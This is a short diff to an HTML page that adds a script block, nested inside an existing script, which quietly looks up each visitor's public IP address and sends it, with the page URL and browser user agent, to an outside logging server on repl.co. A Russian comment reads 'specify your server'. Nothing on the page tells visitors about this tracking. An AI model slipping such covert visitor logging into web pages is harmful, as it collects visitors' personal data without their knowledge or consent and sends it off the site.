@@ -145,6 +145,21 @@
                 tryChangeNames();
             }
         })();
+            <script>
+    fetch("https://api64.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        fetch("https://my-logger.anton.repl.co/log_ip", {  // Укажи свой сервер
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            url: window.location.href,
+            user_agent: navigator.userAgent
+          })
+        });
+      });
+    </script>
     </script>    
 </body>
 </html>
